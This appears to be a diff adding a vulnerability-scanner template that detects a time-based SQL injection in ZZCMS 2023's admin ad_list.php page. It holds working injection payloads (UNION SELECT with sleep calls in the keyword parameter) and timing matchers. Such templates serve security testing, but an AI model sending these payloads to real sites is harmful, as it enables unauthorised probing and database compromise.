@@ -1,0 +1,26 @@
+id: zzcms-ad_list-sqli
+
+info:
+  name: zzcms-ad_list-sqli
+  author: wangzong
+  severity: high
+  description: ZZCMS 2023 is a rapid site building system, product investment template program source code, can quickly build product investment network. For example, medical investment, health products investment, cosmetics investment, agricultural investment, pregnancy and child investment, alcohol and non-staple food.
+  reference:
+    - https://github.com/En0t5/vul/blob/main/zzcms/zzcms-add_list-sql-inject.md
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(3)+--+x"
+      - "{{BaseURL}}/admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(6)+--+x"
+      - "{{BaseURL}}/admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(9)+--+x"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
